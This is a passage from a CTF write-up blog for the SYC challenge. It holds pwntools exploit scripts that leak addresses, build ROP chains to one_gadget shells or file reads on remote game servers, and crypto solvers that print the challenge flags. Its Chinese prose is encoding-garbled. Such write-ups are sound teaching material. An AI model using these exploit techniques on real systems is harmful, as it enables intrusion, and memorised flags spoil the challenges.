class="line">pl+=asm(shellcraft.read(<span class="number">3</span>, someplace, <span class="number">0x20</span>))</span><br><span class="line">pl+=asm(shellcraft.write(<span class="number">1</span>, someplace, <span class="number">0x20</span>))</span><br><span class="line">r.send(pl)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">buf=<span class="number">0x4040E0</span></span><br><span class="line">pl=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x10</span>-<span class="number">8</span>)+p64(canary)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(buf)</span><br><span class="line">r.sendline(pl)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="ez-fullprotection"><a href="#ez-fullprotection" class="headerlink" title="ez_fullprotection"></a>ez_fullprotection</h3><p>scanfæ³„éœ²_startåœ°å€ç»•PIEï¼Œçº¿ç¨‹æº¢å‡ºTLSè¦†ç›–canaryã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;pwn.node.game.sycsec.com&#x27;</span>,<span class="number">30161</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./ez_fullprotection&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line">r.sendline(<span class="string">b&#x27;x&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.sendline(<span class="string">b&#x27;+&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;entered &#x27;</span>)</span><br><span class="line">_start=<span class="built_in">eval</span>(r.recvuntil(<span class="string">b&#x27;.&#x27;</span>)[:-<span class="number">1</span>])</span><br><span class="line">base=_start - elf.sym._start</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(base))</span><br><span class="line"></span><br><span class="line">puts_plt=base+elf.plt.puts</span><br><span class="line">puts_got=base+elf.got.puts</span><br><span class="line">pop_rdi=base+<span class="number">0x16e3</span></span><br><span class="line">ret=base+<span class="number">0x101a</span></span><br><span class="line">ret_addr=base+<span class="number">0x1541</span></span><br><span class="line"></span><br><span class="line">pl=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x30</span>+<span class="number">8</span>)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(ret_addr)</span><br><span class="line">pl=pl.ljust(<span class="number">0x870</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">r.sendline(pl)</span><br><span class="line"></span><br><span class="line">puts_addr=u64(r.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc_base=puts_addr-libc.sym.puts</span><br><span class="line">ogg=[<span class="number">0xe3afe</span>, <span class="number">0xe3b01</span>, <span class="number">0xe3b04</span>]</span><br><span class="line">ogg=[libc_base+k <span class="keyword">for</span> k <span class="keyword">in</span> ogg]</span><br><span class="line"></span><br><span class="line">pop_4=base+<span class="number">0x16dc</span></span><br><span class="line">pl=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x30</span>+<span class="number">8</span>)+p64(pop_4)+p64(<span class="number">0</span>)*<span class="number">4</span>+p64(ogg[<span class="number">0</span>])</span><br><span class="line">r.sendline(pl)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>â€‹    </p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="SignIn"><a href="#SignIn" class="headerlink" title="SignIn"></a>SignIn</h3><blockquote><p>Biboâ€¦Hello! ä½ å¥½! ã“ã‚“ã«ã¡ã¯! ĞŸÑ€Ğ¸Ğ²ĞµÑ‚! 5359437b48656c6c6f5f576f726c645f43727970746f5f6269626f6269626f7dâ€¦ Hmmâ€¦ Something goes wrong with my grettings bot.</p></blockquote><p>16è¿›åˆ¶è½¬å­—ç¬¦ä¸²ï¼š<code>SYC&#123;Hello_World_Crypto_bibobibo&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="proof-of-work"><a href="#proof-of-work" class="headerlink" title="proof_of_work"></a>proof_of_work</h3><blockquote><p>é¢˜ç›®é“¾æ¥ï¼šnc 59.110.20.54:5526 Build your own function to solve proof_of_work!</p></blockquote><p>PoWä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;59.110.20.54&#x27;</span>,<span class="number">5526</span>)</span><br><span class="line"></span><br><span class="line">table = string.ascii_letters+string.digits</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">PoW</span>():</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;XXXX+&#x27;</span>)</span><br><span class="line">    suffix = r.recv(<span class="number">16</span>).decode(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;== &#x27;</span>)</span><br><span class="line">    cipher = r.recvline().strip().decode(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    proof = mbruteforce(<span class="keyword">lambda</span> x: sha256((x + suffix).encode()).hexdigest() ==</span><br><span class="line">                        cipher, table, length=<span class="number">4</span>, method=<span class="string">&#x27;fixed&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;XXXX: &#x27;</span>, proof)</span><br><span class="line">    </span><br><span class="line">PoW()</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Congrats! Your flag is: SYC&#123;st3p_1nt0_1nter4ctive_Crypt0graphy&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="SimpleRSA"><a href="#SimpleRSA" class="headerlink" title="SimpleRSA"></a>SimpleRSA</h3><blockquote><p>So simple RSA! Waitâ€¦ Are you kidding me? <a href="https://en.wikipedia.org/wiki/RSA_(cryptosystem">https://en.wikipedia.org/wiki/RSA_(cryptosystem</a>) hint: flag&lt;p</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> * </span><br><span class="line">flag = <span class="string">b&quot;SYC&#123;Al3XEI_FAKE_FLAG&#125;&quot;</span></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag) == <span class="number">35</span></span><br><span class="line">p,q = [getPrime(<span class="number">2048</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="string">&quot;__&quot;</span>] </span><br><span class="line">n = p*q </span><br><span class="line">e = <span class="number">65537</span> </span><br><span class="line">c = gmpy2.powmod(bytes_to_long(flag),e,n) </span><br><span class="line"><span class="built_in">print</span>(p) </span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="comment">#24724324630507415330944861660078769085865178656494256140070836181271808964994457686409910764936630391300708451701526900994412268365698217113884698394658886249353179639767806926527103624836198494439742123128823109527320850165486500517304731554371680236789357527395416607541627295126502440202040826686102479225702795427693781581584928770373613126894936500089282093366117940069743670997994742595407158340397268147325612840109162997306902492023078425623839297511182053658542877738887677835528624045235391227122453939459585542485427063193993069301141720316104612551340923656979591045138487394366671477460626997125944456537</span></span><br><span class="line"><span class="comment">#510345661718450375632304764819724223824018609359964259503762283253350010161515190912152623604019093266967095847334388281390406831587663253164256543905694021952211220652820225527413861208452760215767828927039893435528572148282529198773772864255061213208279999011194952146362748485103032149806538140693537361755210176698895104708379400806511907719904867068865970241208806615061055047254026118016836750283966478103987375361826198930529462261013324904522014804502582865716441828895047550041401172127129749969507853355531197814919603963664646220505672302543085959372679395717892060245461464861507164276442140407308832537707450729432224150754603518526288767105682399190438680085925078051459448618725871249563011864525585870188123725554411655044152994826056900502298772802133526591794328224932405680583757307064395792317383571866619582974377344736930271554160701478385763426091091686496788999588340419226785217028504684542197970387916262126278955278523452903043316452825738030645100271595942652498852506660789605846309602343932245435421425673058238785509280366229754404949219663043627431437755087855502139890639468481922788973821783957766433857773771229298328019250652625289700950165414584983487319078090573179470893450632419467111117341472</span></span><br></pre></td></tr></table></figure></blockquote><p>$d = e^{-1} \bmod p,\;\;\; m = c^d \bmod p$ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = <span class="number">24724324630507415330944861660078769085865178656494256140070836181271808964994457686409910764936630391300708451701526900994412268365698217113884698394658886249353179639767806926527103624836198494439742123128823109527320850165486500517304731554371680236789357527395416607541627295126502440202040826686102479225702795427693781581584928770373613126894936500089282093366117940069743670997994742595407158340397268147325612840109162997306902492023078425623839297511182053658542877738887677835528624045235391227122453939459585542485427063193993069301141720316104612551340923656979591045138487394366671477460626997125944456537</span></span><br><span class="line">c = <span class="number">510345661718450375632304764819724223824018609359964259503762283253350010161515190912152623604019093266967095847334388281390406831587663253164256543905694021952211220652820225527413861208452760215767828927039893435528572148282529198773772864255061213208279999011194952146362748485103032149806538140693537361755210176698895104708379400806511907719904867068865970241208806615061055047254026118016836750283966478103987375361826198930529462261013324904522014804502582865716441828895047550041401172127129749969507853355531197814919603963664646220505672302543085959372679395717892060245461464861507164276442140407308832537707450729432224150754603518526288767105682399190438680085925078051459448618725871249563011864525585870188123725554411655044152994826056900502298772802133526591794328224932405680583757307064395792317383571866619582974377344736930271554160701478385763426091091686496788999588340419226785217028504684542197970387916262126278955278523452903043316452825738030645100271595942652498852506660789605846309602343932245435421425673058238785509280366229754404949219663043627431437755087855502139890639468481922788973821783957766433857773771229298328019250652625289700950165414584983487319078090573179470893450632419467111117341472</span></span><br><span class="line">d = inverse_mod(e,p-<span class="number">1</span>)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,p)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="string">b&#x27;SYC&#123;Just_a_s1mple_modular_equation&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="OTPTwice"><a href="#OTPTwice" class="headerlink" title="OTPTwice"></a>OTPTwice</h3><blockquote><p>I invented a new symmetric cryptosystem, and I believe you will never break it!</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> xor </span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> urandom </span><br><span class="line">flag = <span class="string">b&quot;SYC&#123;Al3XEI_FAKE_FLAG&#125;&quot;</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># step0: key generation &amp; distribution</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s0</span>(<span class="params">msg</span>): </span><br><span class="line">    k1,k2 = [urandom(<span class="built_in">len</span>(msg)) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="string">&quot;__&quot;</span>] </span><br><span class="line">    <span class="keyword">return</span> k1,k2 </span><br><span class="line"></span><br><span class="line"><span class="comment">#  </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># step1: Alice encrypt M, and send it to Bob</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s1</span>(<span class="params">msg,k1</span>):</span><br><span class="line">    c1 = xor(msg,k1)</span><br><span class="line">    <span class="keyword">return</span> c1 </span><br><span class="line"></span><br><span class="line"><span class="comment"># step2: Bob encrypt c1, and send it to Alice </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s2</span>(<span class="params">msg,k2</span>):</span><br><span class="line">    c2 = xor(msg,k2) </span><br><span class="line">    <span class="keyword">return</span> c2 </span><br><span class="line"></span><br><span class="line"><span class="comment"># step3: Alice decrypt c2, and send it to Bob.</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s3</span>(<span class="params">msg,k1</span>):</span><br><span class="line">    c3 = xor(msg,k1)</span><br><span class="line">    <span class="keyword">return</span> c3 </span><br><span class="line"></span><br><span class="line"><span class="comment"># step4: Bob decrypt c3, get M.</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s4</span>(<span class="params">msg,k2</span>):</span><br><span class="line">    m_ = xor(msg,k2) </span><br><span class="line">    <span class="keyword">return</span> m_ </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">msg,k1,k2</span>): </span><br><span class="line">    c1 = s1(msg,k1) </span><br><span class="line">    c2 = s2(c1,k2) </span><br><span class="line">    c3 = s3(c2,k1)</span><br><span class="line">    m_ = s4(c3,k2) </span><br><span class="line">    <span class="keyword">assert</span> msg == m_</span><br><span class="line"></span><br><span class="line"><span class="comment"># Here&#x27;s what hacker Eve got:</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_</span>(<span class="params">msg,k1,k2</span>):</span><br><span class="line">    c1 = s1(msg,k1) </span><br><span class="line">    c2 = s2(c1,k2) </span><br><span class="line">    c3 = s3(c2,k1)</span><br><span class="line">    m_ = s4(c3,k2) </span><br><span class="line">    <span class="keyword">if</span> HACK == <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span>(c1) </span><br><span class="line">        <span class="built_in">print</span>(c2) </span><br><span class="line">        <span class="built_in">print</span>(c3) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">k1,k2 = s0(flag) </span><br><span class="line">encrypt_(flag,k1,k2) </span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">b&#x27;\xdbi\xab\x8d\xfb0\xd3\xfe!\xf8Xpy\x80w\x8c\x87\xb9&#x27;</span></span><br><span class="line"><span class="string">b&#x27;o\xb0%\xfb\xdb\x0e\r\x04\xde\xd1\x9a\x08w\xda4\x0f\x0cR&#x27;</span></span><br><span class="line"><span class="string">b&#x27;\xe7\x80\xcd\ria\xb2\xca\x89\x1a\x9d;|#3\xf7\xbb\x96&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>æ¨å¯¼æœ‰ $m = c_1 \oplus c_2 \oplus c_3$ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> strxor</span><br><span class="line"></span><br><span class="line">c1 = <span class="string">b&#x27;\xdbi\xab\x8d\xfb0\xd3\xfe!\xf8Xpy\x80w\x8c\x87\xb9&#x27;</span></span><br><span class="line">c2 = <span class="string">b&#x27;o\xb0%\xfb\xdb\x0e\r\x04\xde\xd1\x9a\x08w\xda4\x0f\x0cR&#x27;</span></span><br><span class="line">c3 = <span class="string">b&#x27;\xe7\x80\xcd\ria\xb2\xca\x89\x1a\x9d;|#3\xf7\xbb\x96&#x27;</span></span><br><span class="line"></span><br><span class="line">m = strxor(strxor(c1,c2),c3)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;I_l0v3_Crypt0&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="OldAlgorithm"><a href="#OldAlgorithm" class="headerlink" title="OldAlgorithm"></a>OldAlgorithm</h3><blockquote><p>An old algorithm but widely used nowadays.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">import</span> os </span><br><span class="line">flag = <span class="string">b&quot;SYC&#123;Al3XEI_FAKE_FLAG&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">pad = <span class="keyword">lambda</span> msg,padlen: msg+os.urandom(padlen-<span class="built_in">len</span>(msg))</span><br><span class="line"></span><br><span class="line">flag = pad(flag,<span class="number">32</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(flag))</span><br><span class="line">p = [getPrime(<span class="number">16</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)] </span><br><span class="line">c = [bytes_to_long(flag)%i <span class="keyword">for</span> i <span class="keyword">in</span> p] </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;p=&#x27;</span>,p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c=&#x27;</span>,c)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">p= [58657, 47093, 47963, 41213, 57653, 56923, 41809, 49639, 44417, 38639, 39857, 53609, 55621, 41729, 60497, 44647, 39703, 55117, 44111, 57131, 37747, 63419, 63703, 64007, 46349, 39241, 39313, 44909, 40763, 46727, 34057, 56333]</span></span><br><span class="line"><span class="string">c= [36086, 4005, 3350, 23179, 34246, 5145, 32490, 16348, 13001, 13628, 7742, 46317, 50824, 23718, 32995, 7640, 10590, 46897, 39245, 16633, 31488, 36547, 42136, 52782, 31929, 34747, 29026, 18748, 6634, 9700, 8126, 5197]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>CRTç®—æ³•ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">p = [<span class="number">58657</span>, <span class="number">47093</span>, <span class="number">47963</span>, <span class="number">41213</span>, <span class="number">57653</span>, <span class="number">56923</span>, <span class="number">41809</span>, <span class="number">49639</span>, <span class="number">44417</span>, <span class="number">38639</span>, <span class="number">39857</span>, <span class="number">53609</span>, <span class="number">55621</span>, <span class="number">41729</span>, <span class="number">60497</span>, <span class="number">44647</span>, <span class="number">39703</span>, <span class="number">55117</span>, <span class="number">44111</span>, <span class="number">57131</span>, <span class="number">37747</span>, <span class="number">63419</span>, <span class="number">63703</span>, <span class="number">64007</span>, <span class="number">46349</span>, <span class="number">39241</span>, <span class="number">39313</span>, <span class="number">44909</span>, <span class="number">40763</span>, <span class="number">46727</span>, <span class="number">34057</span>, <span class="number">56333</span>]</span><br><span class="line">c = [<span class="number">36086</span>, <span class="number">4005</span>, <span class="number">3350</span>, <span class="number">23179</span>, <span class="number">34246</span>, <span class="number">5145</span>, <span class="number">32490</span>, <span class="number">16348</span>, <span class="number">13001</span>, <span class="number">13628</span>, <span class="number">7742</span>, <span class="number">46317</span>, <span class="number">50824</span>, <span class="number">23718</span>, <span class="number">32995</span>, <span class="number">7640</span>, <span class="number">10590</span>, <span class="number">46897</span>, <span class="number">39245</span>, <span class="number">16633</span>, <span class="number">31488</span>, <span class="number">36547</span>, <span class="number">42136</span>, <span class="number">52782</span>, <span class="number">31929</span>, <span class="number">34747</span>, <span class="number">29026</span>, <span class="number">18748</span>, <span class="number">6634</span>, <span class="number">9700</span>, <span class="number">8126</span>, <span class="number">5197</span>]</span><br><span class="line">m = crt(c,p)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;CRT_1s_s0_ju1cy!&#125;]mC\x9c\xf9C/\xfc\xb8t\x16&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="easy-classic"><a href="#easy-classic" class="headerlink" title="easy_classic"></a>easy_classic</h3><blockquote><p>éå¸¸å¥½å¥—å¨ƒï¼Œä½¿æˆ‘çš„å¤å…¸æ—‹è½¬</p></blockquote><p>æ¯ä¸€å±‚è§£å‡ºçš„å­—ç¬¦ä¸²ä¸ºä¸‹ä¸€å±‚zipå‹ç¼©åŒ…å¯†ç ã€‚</p><p>ç¬¬1å±‚ï¼š<code>udzeojxuwqcu</code>ï¼ŒROT10ï¼Œå¾—ï¼š<code>enjoythegame</code></p><p>ç¬¬2å±‚ï¼š<code>ialhhooavtepcyr</code>ï¼Œæ …æ 7ï¼Œå¾—ï¼š<code>ilovecryptohaha</code></p><p>ç¬¬3å±‚ï¼š<code>5a6H5a6Z5LiH5rOV55qE6YKj5Liq5rqQ5aS0</code>ï¼Œbase64ï¼Œå¾—ï¼š<code>å®‡å®™ä¸‡æ³•çš„é‚£ä¸ªæºå¤´</code></p><p>ç¬¬4å±‚ï¼š<code>ç†Šæ›°ï¼šå‘‹é£Ÿé£Ÿé£Ÿå–å™—å±±ç¬¨ç¬¨ç ´å—„å’¯å“ˆå‹•å—¡é›œé¡å—’å˜¿å•½æ²’æ­¡ç ´å–å’¬æˆ‘å•½å¯¶ç›œå™”å’¯æ²’</code>ï¼Œç†Šæ›°è§£å¯†ï¼Œå¾—ï¼š<code>never gonna give you up</code></p><p>ç¬¬5å±‚ï¼š<code>password: adltlfltqrcy</code>ï¼Œ<code>key: ğŸ‘ğŸ‘˜ğŸ‘ ğŸ‘©ğŸ‘ğŸ‘˜ğŸ‘¤ğŸ‘œ</code>ï¼Œ</p><p>å…ˆbase100ï¼Œå¾—ï¼škey=<code>fairgame</code>ï¼Œå†playfairï¼Œå¾—ï¼š<code>genshinstart</code></p><p>flagï¼š<code>SYC&#123;classical_1s_fun&#125;</code></p><p>â€‹    </p><h3 id="PolyRSA"><a href="#PolyRSA" class="headerlink" title="PolyRSA"></a>PolyRSA</h3><blockquote><p>Harder RSA. Check it out!</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *  </span><br><span class="line">flag = <span class="string">b&quot;SYC&#123;Al3XEI_FAKE_FLAG&#125;&quot;</span></span><br><span class="line">p,q = [getPrime(<span class="number">2048</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="string">&quot;__&quot;</span>] </span><br><span class="line">e1,e2 = [getPrime(<span class="number">17</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="string">&quot;__&quot;</span>] </span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = p*q </span><br><span class="line">c1 = gmpy2.powmod(<span class="number">2</span>*p + <span class="number">3</span>*q,e1,n)</span><br><span class="line">c2 = gmpy2.powmod(<span class="number">5</span>*p + <span class="number">7</span>*q,e2,n) </span><br><span class="line">c = gmpy2.powmod(bytes_to_long(flag),e,n) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e1=&quot;</span>,e1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e2=&quot;</span>,e2) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c1=&quot;</span>,c1) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c2=&quot;</span>,c2) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c=&quot;</span>,c)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n=&quot;</span>,n)</span><br><span class="line"></span><br><span class="line"><span class="comment">#e1= 113717</span></span><br><span class="line"><span class="comment">#e2= 80737</span></span><br><span class="line"><span class="comment">#c1= 97528398828294138945371018405777243725957112272614466238005409057342884425132214761228537249844134865481148636534134025535106624840957740753950100180978607132333109806554009969378392835952544552269685553539656827070349532458156758965322477969141073720173165958341043159560928836304172136610929023123638981560836183245954461041167802574206323129671965436040047358250847178930436773249800969192016749684095882580749559014647942135761757750292281205876241566597813517452803933496218995755905344070203047797893640399372627351254542342772576533524820435965479881620338366838326652599102311019884528903481310690767832417584600334987458835108576322111553947045733143836419313427495888019352323209000292825566986863770366023326755116931788018138432898323148059980463407567431417724940484236335082696026821105627826117901730695680967455710434307270501190258033004471156993017301443803372029004817834317756597444195146024630164820841200575179112295902020141040090350486764038633257871003899386340004440642516190842086462237559715130631205046041819931656962904630367121414263911179041905140516402771368603623318492074423223885367923228718341206283572152570049573607906130786276734660847733952210105659707746969830132429975090175091281363770357</span></span><br><span class="line"><span class="comment">#c2= 353128571201645377052005694809874806643786163076931670184196149901625274899734977100920488129375537186771931435883114557320913415191396857882995726660784707377672210953334914418470453787964899846194872721616628198368241044602144880543115393715025896206210152190007408112767478800650578941849344868081146624444817544806046188600685873402369145450593575618922226415069043442295774369567389939040265656574664538667552522329712111984168798829635080641332045614585247317991581514218486004191829362787750803153463482021229058714990823658655863245025037102127138472397462755776598314247771125981017814912049441827643898478473451005083533693951329544115861795587564408860828213753948427321483082041546722974666875065831843384005041800692983406353922680299538080900818930589336142421748023025830846906503542594380663429947801329079870530727382679634952272644949425079242992486832995962516376820051495641486546631849426876810933393153871774796182078367277299340503872124124714036499367887886486264658590613431293656417255355575602576047502506125375605713228912611320198066713358654181533335650785578352716562937038768171269136647529849805172492594142026261051266577821582011917001752590659862613307646536049830151262848916867223615064832279222</spa